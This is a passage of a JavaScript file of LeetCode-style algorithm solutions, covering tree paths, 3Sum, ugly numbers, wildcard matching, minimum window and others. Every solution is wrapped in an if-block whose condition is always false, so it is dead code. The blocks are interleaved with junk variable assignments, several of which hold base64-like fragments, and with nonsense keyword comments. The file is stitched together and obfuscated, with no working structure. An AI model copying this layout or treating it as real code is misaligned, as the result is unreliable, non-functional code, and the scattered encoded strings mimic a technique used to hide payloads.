   [5,4,11,2],
   [5,8,4,5]
]
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {number} sum
 * @return {number[][]}
 */
var pathSum = function(root, sum) {
    var result = [];
    
    if (!root) {
        return result;
    }
    
    genPath(result, root, [], 0, sum);
    
    return result;
};

function genPath(result, root, curArr, curSum, target) {
    curArr.push(root.val);
    curSum += root.val;
    
    if ((curSum === target) && !root.left && !root.right) {
        result.push(curArr);
        return;
    }
    
    if (root.left) {
        genPath(result, root.left, curArr.concat(), curSum, target);
    }
    
    if (root.right) {
        genPath(result, root.right, curArr.concat(), curSum, target);
    }
}

}

    var jwkqcelt = 'cPixLX';
    var nirpksn = 'VTnZ';
    var vkrkkwrxz = 'ThHvwjWRtZ';
if (Array.isArray(4)) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var phhsztsqdveaywk = 'aR1VL';
    var ecuhehrf = 'shOgHEG';
    var znxwp = 'SUNB';
    var hopefk = 'zUNhoq';
    var geaabp = 'Z0l';
if ('true' === true) {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var jpgorcdmn = 'nDUkYImud';
    var ngwmzkewazuxlp = 'DazdDbjBL';
    var nyjjfio = 'RkCUBs';
if (2 === 20) {
    /**
Write a program to find the nth super ugly number.

Super ugly numbers are positive numbers whose all prime factors are in the given prime list primes of size k. For example, [1, 2, 4, 7, 8, 13, 14, 16, 19, 26, 28, 32] is the sequence of the first 12 super ugly numbers given primes = [2, 7, 13, 19] of size 4.

Note:
(1) 1 is a super ugly number for any given primes.
(2) The given numbers in primes are in ascending order.
(3) 0 < k ≤ 100, 0 < n ≤ 106, 0 < primes[i] < 1000.
*/

/**
 * @param {number} n
 * @param {number[]} primes
 * @return {number}
 */
var nthSuperUglyNumber = function(n, primes) {
    var primeIndex = [],
        result = [],
        len = primes.length,
        tmp,
        min,
        curPrimeIndex,
        i,
        j;
        
    for (i = 0; i < len; i++) {
        primeIndex.push(0);
    }
    
    result.push(1);
    
    for (i = 1; i < n;) {
        min = Number.MAX_VALUE;
        curPrimeIndex = 0;
        for (j = 0; j < len; j++) {
            tmp = result[primeIndex[j]] * primes[j];
            
            if (tmp < min) {
                curPrimeIndex = j;
                min = tmp;
            }
        }
        
        primeIndex[curPrimeIndex]++;
        
        if (min !== result[i - 1]) {
            result[i] = min;
            i++;
        }
    }
    
    return result[n - 1];
};

}

    var sgmawapximctyrl = 'Q2k4dklG';
    var fcjlxptnlrho = 'EdES';
    var oubvjykh = 'QnlaWFp';
    var kxgxsae = 'fezkMam';
    var gnbruv = 'sYm5SeklIS';
    var kcbcdncfielc = 'LbAIveee';
    var ywquv = 'nBaMmgwTF';
    var jklakxho = 'HfwZ';
    var baryjw = 'dOc2F';
if ('true' === true) {
    /**
Additive number is a string whose digits can form additive sequence.

A valid additive sequence should contain at least three numbers. Except for the first two numbers, each subsequent number in the sequence must be the sum of the preceding two.

For example:
"112358" is an additive number because the digits can form an additive sequence: 1, 1, 2, 3, 5, 8.

1 + 1 = 2, 1 + 2 = 3, 2 + 3 = 5, 3 + 5 = 8
"199100199" is also an additive number, the additive sequence is: 1, 99, 100, 199.
1 + 99 = 100, 99 + 100 = 199
Note: Numbers in the additive sequence cannot have leading zeros, so sequence 1, 2, 03 or 1, 02, 3 is invalid.

Given a string containing only digits '0'-'9', write a function to determine if it's an additive number.

Follow up:
How would you handle overflow for very large input integers?
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isAdditiveNumber = function(num) {
    var len = num.length,
        i,
        j;
        
    for (i = 1; i <= len / 2; i++) {
        for (j = 1; j <= len / 2; j++) {
            if (canBeAdded(num.substr(0, i), num.substr(i, j), num.substr(i + j))) {
                return true;
            }
        }
    }
    
    return false;
};

function canBeAdded(a, b, c) {
    if ((a.length > 1 && a.charAt(0) === '0') || (b.length > 1 && b.charAt(0) === '0') || (c.length >= 1 && c.charAt(0) === '0')) {
        return false;
    }
    
    var aNum = parseInt(a),
        bNum = parseInt(b),
        sum = aNum + bNum + '';
        
    if (c === sum) {
        return true;
    }
    
    if (c.substr(0, sum.length) !== sum) {
        return false;
    }
    
    return canBeAdded(b, sum, c.substr(sum.length));
}

}

    var ycigyfuem = 'SieFGL';
    var mosygaewmugz = 'XTnJJSFJ';
if (4 === 19) {
    /**
Given an unsorted array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....

Example:
(1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. 
(2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2].

Note:
You may assume all input has valid answer.

Follow Up:
Can you do it in O(n) time and/or in-place with O(1) extra space?
*/
/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var wiggleSort = function(nums) {
    var len = nums.length,
        temp = [],
        midIndex = parseInt((len + 1) / 2),
        i,
        l,
        r,
        medium;
        
    medium = findKth(0, len - 1, midIndex, nums);
    
    for (i = 0, l = 0, r = len - 1; i < len; i++) {
        if (nums[i] < medium) {
            temp[l++] = nums[i];
        } else if (nums[i] > medium) {
            temp[r--] = nums[i];
        }
    }
    
    while (l < midIndex) {
        temp[l++] = medium;
    }
    
    while (r >= midIndex) {
        temp[r--] = medium;
    }
    
    r = len;
    
    for (i = 0; i < len; i++) {
        nums[i] = (i & 1) === 0? temp[--l] : temp[--r];
    }
};

function findKth(start, end, k, nums) {
    if (start >= end) {
        return nums[end];
    }
    
    var index = partition(start, end, nums),
        count = index - start + 1;
    
    if (count === k) {
        return nums[index];
    }
    
    if (count < k) {
        return findKth(index + 1, end, k - count, nums);
    }
    
    return findKth(start, index - 1, k, nums);
}

function partition(start, end, nums) {
    var val = nums[start],
        i,
        j;
    
    i = start + 1;
    j = end;
    
    while (true) {
        while (nums[i] <= val) {
            i++;
        }
        
        while (nums[j] > val) {
            j--;
        }
        
        if (i >= j) {
            break;
        }
        
        swap(nums, i, j);
    }
    
    swap(nums, j, start);
    
    return j;
}

function swap(nums, i, j) {
    var temp = nums[i];
    
    nums[i] = nums[j];
    nums[j] = temp;
}

}

    var csymtcbeg = 'mtdRZnSkxw';
if (9 instanceof String) {
    /**
Implement wildcard pattern matching with support for '?' and '*'.

'?' Matches any single character.
'*' Matches any sequence of characters (including the empty sequence).

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "*") → true
isMatch("aa", "a*") → true
isMatch("ab", "?*") → true
isMatch("aab", "c*a*b") → false
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 */
var isMatch = function(s, p) {
    let sIndex = 0;
    let pIndex = 0;
    let startIndex = -1; // startIndex of * in p
    let match = 0; // the position in s that matches with p 
    
    while (sIndex < s.length) {
        // matches, both advance
        if (pIndex < p.length && (s.charAt(sIndex) === p.charAt(pIndex) || p.charAt(pIndex) === '?')) {
            pIndex++;
            sIndex++;
        } else if (pIndex < p.length && p.charAt(pIndex) === '*') {
            startIndex = pIndex;
            match = sIndex;
            pIndex++;
        } else if (startIndex !== -1) {
            pIndex = startIndex + 1;
            match++;
            sIndex = match;
        } else {
            return false;
        }
    }
    
    while (pIndex < p.length && p.charAt(pIndex) === '*') {
        pIndex++;
    }
    
    return pIndex === p.length;
};

}

    var kqanvtgivtrm = '2SU';
    var arovwl = 'yExBdznkoK';
    var ctfmfcyyqthoooi = 'dScGMyR';
if ('v' === 'E') {
    /**
Given an integer n, count the total number of digit 1 appearing in all non-negative integers less than or equal to n.

For example:
Given n = 13,
Return 6, because digit 1 occurred in the following numbers: 1, 10, 11, 12, 13.

Hint:

Beware of overflow.
*/
/**
intuitive: 每10个数, 有一个个位是1, 每100个数, 有10个十位是1, 每1000个数, 有100个百位是1.  做一个循环, 每次计算单个位上1得总个数(个位,十位, 百位).  
例子:
以算百位上1为例子:   假设百位上是0, 1, 和 >=2 三种情况: 
    case 1: n=3141092, a= 31410, b=92. 计算百位上1的个数应该为 3141 *100 次.
    case 2: n=3141192, a= 31411, b=92. 计算百位上1的个数应该为 3141 *100 + (92+1) 次. 
    case 3: n=3141592, a= 31415, b=92. 计算百位上1的个数应该为 (3141+1) *100 次. 
以上三种情况可以用 一个公式概括:
(a + 8) / 10 * m + (a % 10 == 1) * (b + 1);
*/
/**
 * @param {number} n
 * @return {number}
 */
var countDigitOne = function(n) {
    var ones = 0,
        a,
        b,
        m;
        
    for (m = 1; m <= n; m *= 10) {
        a = Math.floor(n / m);
        b = n % m;
        ones += Math.floor((a + 8) / 10) * m;
        
        if (a % 10 === 1) {
            ones += b + 1;
        }
    }
    
    return ones;
};

}

    var pskbwemgd = 'nZCJpo';
    var jjlcrejmzz = 'mliR1Vn';
if (null === 2) {
    /**
Given two strings s and t, determine if they are isomorphic.

Two strings are isomorphic if the characters in s can be replaced to get t.

All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.

For example,
Given "egg", "add", return true.

Given "foo", "bar", return false.

Given "paper", "title", return true.

Note:
You may assume both s and t have the same length.
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isIsomorphic = function(s, t) {
    var len = s.length,
        mapS = {},
        mapT = {},
        curS,
        curT,
        i;
        
    for (i = 0; i < len; i++) {
        curS = s.charAt(i);
        curT = t.charAt(i);
        
        if (!mapS.hasOwnProperty(curS)) {
            mapS[curS] = curT;
        } else if (mapS[curS] !== curT) {
            return false;
        }
        
        if (!mapT.hasOwnProperty(curT)) {
            mapT[curT] = curS;
        } else if (mapT[curT] !== curS) {
            return false;
        }
    }
    
    return true;
}; 

}

    var ipskvy = 'OmvkKIfZ';
    var osztupxcz = 'WTI5dWRHVj';
    var mgigyt = 'RdNG';
    var ccwajtnjcfw = 'RkQ0J0Wlc';
if (1 === 20) {
    /**
Given a digit string, return all possible letter combinations that the number could represent.

A mapping of digit to letters (just like on the telephone buttons) is given below.



Input:Digit string "23"
Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"].
Note:
Although the above answer is in lexicographical order, your answer could be in any order you want.
*/
/**
 * @param {string} digits
 * @return {string[]}
 */
var letterCombinations = function(digits) {
    var len = digits.length,
        result = [],
        map = {
            '1': [''],
            '2': ['a', 'b', 'c'],
            '3': ['d', 'e', 'f'],
            '4': ['g', 'h', 'i'],
            '5': ['j', 'k', 'l'],
            '6': ['m', 'n', 'o'],
            '7': ['p', 'q', 'r', 's'],
            '8': ['t', 'u', 'v'],
            '9': ['w', 'x', 'y', 'z']
        };
        
    if (len === 0) {
        return result;
    }
    
    return genStrings([''], 0, len, digits, map);
};

function genStrings(curArr, index, len, digits, map) {
    var length = curArr.length,
        next = [],
        temp,
        i,
        j;
    
    if (index === len) {
        return curArr;
    }
    
    for (i = 0; i < length; i++) {
        for (j = 0; j < map[digits.charAt(index)].length; j++) {
            temp = curArr[i] + map[digits.charAt(index)][j];
            next.push(temp);
        }
    }    
    
    return genStrings(next, index + 1, len, digits, map);
}

}

    var eixvgge = 'EkPEpjckJ';
    var dcsovff = '1MU';
if ('v' === 'G') {
    /**
You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters.

For example, given:
s: "barfoothefoobarman"
words: ["foo", "bar"]

You should return the indices: [0,9].
(order does not matter).
*/
/**
 * @param {string} s
 * @param {string[]} words
 * @return {number[]}
 */
 
 // TIME LIMIT EXCEEDED...
var findSubstring = function(s, words) {
    var len = s.length,
        wordsLen = words.length,
        wordLen = words[0].length,
        i,
        j,
        m,
        temp,
        toFound = {},
        found = {},
        result = [];
        
    for (i = 0; i < wordsLen; i++) {
        if (!toFound[words[i]]) {
            toFound[words[i]] = 1; 
        } else {
            toFound[words[i]]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        found = {};
        j = i;
        for (m = 0; m < wordsLen; m++) {
            temp = s.slice(j, j + wordLen);
            
            if (!toFound[temp]) {
                break;
            }
            
            if (toFound[temp]) {
                if (!found[temp]) {
                    found[temp] = 1;
                } else {
                    found[temp]++;
                }
            }
            
            if (found[temp] > toFound[temp]) {
                break;
            }
            
            j += wordLen;
        }
        
        if (m === wordsLen) {
            result.push(i);
        }
    }
    
    return result;
};

}

    var ddatqoxatyoy = 'MWyDmd';
if (4 === 20) {
    /**
Write a program to find the n-th ugly number.

Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 is the sequence of the first 10 ugly numbers.

Note that 1 is typically treated as an ugly number.

Hint:

The naive approach is to call isUgly for every number until you reach the nth one. Most numbers are not ugly. Try to focus your effort on generating only the ugly ones.
An ugly number must be multiplied by either 2, 3, or 5 from a smaller ugly number.
The key is how to maintain the order of the ugly numbers. Try a similar approach of merging from three sorted lists: L1, L2, and L3.
Assume you have Uk, the kth ugly number. Then Uk+1 must be Min(L1 * 2, L2 * 3, L3 * 5).
*/
/**
 * @param {number} n
 * @return {number}
 */
var nthUglyNumber = function(n) {
    var result = [],
        primeIndex2 = 0,
        primeIndex3 = 0,
        primeIndex5 = 0,
        cur2,
        cur3,
        cur5,
        i;
    
    result.push(1);
    
    for (i = 1; i < n;) {
        cur2 = result[primeIndex2] * 2;
        cur3 = result[primeIndex3] * 3;
        cur5 = result[primeIndex5] * 5;
        
        cur = Math.min(cur2, cur3, cur5);
        
        if (cur === cur2) {
            primeIndex2++;
        } else if (cur === cur3) {
            primeIndex3++;
        } else {
            primeIndex5++;
        }
        
        if (cur !== result[i - 1]) {
            result.push(cur);
            i++;
        }
    }
    
    return result.pop();
};

}

// hello debug array gtnrm define world await import async object
if (68 > 116) {
    /**
Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0.

Example 1:
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".

Example 2:
Given ["a", "ab", "abc", "d", "cd", "bcd", "abcd"]
Return 4
The two words can be "ab", "cd".

Example 3:
Given ["a", "aa", "aaa", "aaaa"]
Return 0
No such pair of words.
*/

/**
 * @param {string[]} words
 * @return {number}
 */
var maxProduct = function(words) {
    var len = words.length,
        arr = [],
        result = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        arr[i] = 0;
        
        for (j = 0; j < words[i].length; j++) {
            arr[i] |= (1 << (words[i].charCodeAt(j) - 97));
        }
    }
    
    for (i = 0; i < len; i++) {
        for (j = i + 1; j < len; j++) {
            if ((arr[i] & arr[j]) === 0) {
                result = Math.max(result, words[i].length * words[j].length);
            }
        }
    }
    
    return result;
};

}

    var zmqvyypdp = 'DNwNqTKaCJ';
    var dzddpfsd = 'xncGtiMk4';
    var nmkgkbc = 'giiedFR';
    var rfwdguupc = 'xYld';
if ('c' === 'N') {
    /**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        parent = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    parent.push(1);
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        result = [];
        result.push(1);
        for (i = 1; i < curRow; i++) {
            result[i] = parent[i] + parent[i - 1];
        }
        
        result.push(1);
        parent = result.concat();
    }
    
    return result;
};

// in place solution
/**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        
        for (i = curRow - 1; i > 0; i--) {
            result[i] = result[i] + result[i - 1];
        }
        
        result.push(1);
    }
    
    return result;
};

}

    var qzuubrv = 'rKRsf';
    var necgqfj = 'WdWRDNW';
    var fkcmbjm = 'aUVvpG';
if ('m' === 'Y') {
    /**
Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array.

Note:
You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively.
*/

/**
 * @param {number[]} nums1
 * @param {number} m
 * @param {number[]} nums2
 * @param {number} n
 * @return {void} Do not return anything, modify nums1 in-place instead.
 */
var merge = function(nums1, m, nums2, n) {
    // starting from the end!
    while(m > 0 && n > 0) {
        if (nums1[m - 1] > nums2[n - 1]) {
            nums1[m + n - 1] = nums1[m - 1];
            m--;
        } else {
            nums1[m + n - 1] = nums2[n - 1];
            n--;
        }
    }
    
    while (n > 0) {
        nums1[n - 1] = nums2[n - 1];
        n--;
    }
};

}

    var jjfzakcib = 'haR1JGZ';
    var kszriluvzumg = 'NWZeMBXLd';
if (8 instanceof String) {
    /**
Write a function that takes a string as input and reverse only the vowels of a string.

Example 1:
Given s = "hello", return "holle".

Example 2:
Given s = "leetcode", return "leotcede".
*/
/**
 * @param {string} s
 * @return {string}
 */
var reverseVowels = function(s) {
    var len = s.length,
        result = s.split(''),
        vowelSet = new Set(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']),
        indice = [],
        arr = [],
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = result[i];
        
        if (vowelSet.has(ch)) {
            arr.push(ch);
            indice.push(i);
        }
    }
    
    for (i = 0; i < indice.length; i++) {
        result[indice[i]] = arr.pop();
    }
    
    return result.join('');
};

}

    var yusjk = 'G1W';
if (null === 1) {
    /**
Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.

Note:
You must not modify the array (assume the array is read only).
You must use only constant, O(1) extra space.
Your runtime complexity should be less than O(n2).
There is only one duplicate number in the array, but it could be repeated more than once.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var findDuplicate = function(nums) {
    var fast = 0,
        slow = 0,
        find = 0;
        
    while (true) {
        fast = nums[nums[fast]];
        slow = nums[slow];
        
        if (fast === slow) {
            break;
        }
    }
    
    while (find !== slow) {
        find = nums[find];
        slow = nums[slow];
    }
    
    return find;
};


// SOLUTION 2
/**
二分法
复杂度
时间 O(NlogN) 空间 O(1)

思路
实际上，我们可以根据抽屉原理简化刚才的暴力法。我们不一定要依次选择数，然后看是否有这个数的重复数，我们可以用二分法先选取n/2，按照抽屉原理，整个数组中如果小于等于n/2的数的数量大于n/2，说明1到n/2这个区间是肯定有重复数字的。比如6个抽屉，如果有7个袜子要放到抽屉里，那肯定有一个抽屉至少两个袜子。这里抽屉就是1到n/2的每一个数，而袜子就是整个数组中小于等于n/2的那些数。这样我们就能知道下次选择的数的范围，如果1到n/2区间内肯定有重复数字，则下次在1到n/2范围内找，否则在n/2到n范围内找。下次找的时候，还是找一半。

注意
我们比较的mid而不是nums[mid]
因为mid是下标，所以判断式应为cnt > mid，最后返回min

代码
public class Solution {
    public int findDuplicate(int[] nums) {
        int min = 0, max = nums.length - 1;
        while(min <= max){
            // 找到中间那个数
            int mid = min + (max - min) / 2;
            int cnt = 0;
            // 计算总数组中有多少个数小于等于中间数
            for(int i = 0; i < nums.length; i++){
                if(nums[i] <= mid){
                    cnt++;
                }
            }
            // 如果小于等于中间数的数量大于中间数，说明前半部分必有重复
            if(cnt > mid){
                max = mid - 1;
            // 否则后半部分必有重复
            } else {
                min = mid + 1;
            }
        }
        return min;
    }
}

*/

}

    var fmgwebb = 'LHtcO';
    var uqncioafzygqo = 'dWR';
    var kvcelkksuaj = 'iNMnCFpG';
if (0.96 && false) {
    
/**
Given a string s, partition s such that every substring of the partition is a palindrome.

Return the minimum cuts needed for a palindrome partitioning of s.

For example, given s = "aab",
Return 1 since the palindrome partitioning ["aa","b"] could be produced using 1 cut.
*/
/**
 * @param {string} s
 * @return {number}
 */
var minCut = function(s) {
    const len = s.length;
    let dp = [];
    let cut = [];
    let i, j; 
    
    for (i = 0; i < len; i++) {
        dp.push(new Array(len).fill(false));
    }
    
    for (i = 0; i < len; i++) {
        for (j = i; j >= 0; j--) {
            if (s.charAt(j) === s.charAt(i) && (i - j < 2 || dp[j + 1][i - 1])) {
                dp[j][i] = true;
            }
        }
    }
    
    // cur[i] how many cuts from 0 to i
    cut[0] = 0;
    
    for (i = 1; i <= len; i++) {
        for (j = i; j > 0; j--) {
            if (dp[j - 1][i - 1]) {
                cut[i] = Math.min(cut[i] ? cut[i] : Number.MAX_VALUE, cut[j - 1] + 1);
            }
        }
    }
    
    return cut[len] - 1;
};

}

    var lpltctqzslqhcqg = 'FeHBjM1Js';
if ('x' === 'T') {
    /**
Given a string containing only digits, restore it by returning all possible valid IP address combinations.

For example:
Given "25525511135",

return ["255.255.11.135", "255.255.111.35"]. (Order does not matter)
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var restoreIpAddresses = function(s) {
    var result = [],
        len = s.length;
    
    if (len > 12) {
        return result;
    }
    
    helper(result, s, 0, [], len);
    
    return result;
};

function helper(result, s, index, curArr, len) {
    if (curArr.length === 4) {
        if (index === len) {
            result.push(curArr.join('.'));
        }
        return;
    }
    
    var i,
        num;
    
    // only 3 situations
    for (i = index; i < len && i <= index + 3; i++) {
        num = s.substring(index, i + 1);
        
        if (isValid(num)) {
            curArr.push(parseInt(num));
            helper(result, s, i + 1, curArr.concat(), len);
            curArr.pop();
        } 
        
    }
}

function isValid(s) {
    if (s.charAt(0) === '0') {
        return s === '0';
    }
    
    var num = parseInt(s);
    
    return num >= 0 && num <= 255;
}

}

    var lcinrgytpgx = 'qdwgtUKp';
// async object object hello import kovnms number loop object return import return
if (9 instanceof String) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var mrttnhbjlf = 'qCktZ';
    var gwmpisdeyn = 'Ym1WeUt';
if (0.86 && false) {
    /**
Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n).

For example,
S = "ADOBECODEBANC"
T = "ABC"
Minimum window is "BANC".

Note:
If there is no such window in S that covers all characters in T, return the empty string "".

If there are multiple such windows, you are guaranteed that there will always be only one unique minimum window in S.
*/

/**
可以利用两个指针扫描（两个指针分别为start，i），以S = “e b a d b a c c b”（忽略空格），T = “abc”为例：

                                                                            0 1 2 3 4 5 6 7 8

初始化 start = i = 0
i 逐渐往后扫描S直到窗口S[start…i]包含所有T的字符，此时i = 6（字符c的位置）
缩减窗口：此时我们注意到窗口并不是最小的，需要调整 start 来缩减窗口。缩减规则为：如果S[start]不在T中 或者 S[start]在T中但是删除后窗口依然可以包含T中的所有字符，那么start = start+1， 直到不满足上述两个缩减规则。缩减后i即为窗口的起始位置，此例中从e开始窗口中要依次删掉e、b、a、d，start最后等于4 ，那么得到一个窗口大小为6-4+1 = 3
start = start+1(此时窗口肯定不会包含所有的T中的字符)，跳转到步骤2继续寻找下一个窗口。本例中还以找到一个窗口start = 5，i = 8，比上个窗口大，因此最终的最小窗口是S[4…6]
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {string}
 */
var minWindow = function(s, t) {
    var tSet = {},
        tFoundSet = {},
        hasFound = 0,
        lenS = s.length,
        lenT = t.length,
        winStart = -1,
        winEnd = lenS,
        result,
        start,
        c,
        i,
        j;
        
    for (i = 0; i < lenT; i++) {
        tFoundSet[t.charAt(i)] = 0;
        tSet[t.charAt(i)] = tSet[t.charAt(i)]? tSet[t.charAt(i)] + 1 : 1;
    }

    for (i = 0, start = 0; i < lenS; i++) {
        c = s.charAt(i);
        if (tSet.hasOwnProperty(c)) {
            if (tFoundSet[c] < tSet[c]) {
                hasFound++;
            }
            
            tFoundSet[s.charAt(i)]++;
        }
        
        if (hasFound === lenT) {
            while (!tSet[s.charAt(start)] || tFoundSet[s.charAt(start)] > tSet[s.charAt(start)]) {
                if (tFoundSet[s.charAt(start)]) {
                    tFoundSet[s.charAt(start)]--;
                }
                start++;
            }
            
            if (winEnd - winStart > i - start) {
                winStart = start;
                winEnd = i;
            }
            
            tFoundSet[s.charAt(start)]--;
            start++;
            hasFound--;
        }
    }
    
    return winStart !== -1? s.substr(winStart, winEnd - winStart + 1) : '';
};

}

    var jyexrtrbkqug = 'jxwosBO';
if (null === 0) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}

    var eelcimwcp = 'DZGpiMjUwW';
    var rbzeyrtg = 'BGxRrhAy';
if (10 instanceof String) {
    /**
Find all possible combinations of k numbers that add up to a number n, given that only numbers from 1 to 9 can be used and each combination should be a unique set of numbers.

Ensure that numbers within the set are sorted in ascending order.


Example 1:

Input: k = 3, n = 7

Output:

[[1,2,4]]

Example 2:

Input: k = 3, n = 9

Output:

[[1,2,6], [1,3,5], [2,3,4]]
*/
/**
 * @param {number} k
 * @param {number} n
 * @return {number[][]}
 */
var combinationSum3 = function(k, n) {
    var result = [];
    
    fillResult(0, [], 1, k, n, result);
    
    return result;
};

function fillResult(curSum, curArr, startNum, k, n, result) {
    if (curArr.length > k || curSum > n) {
        return;
    }
    
    if (curArr.length === k) {
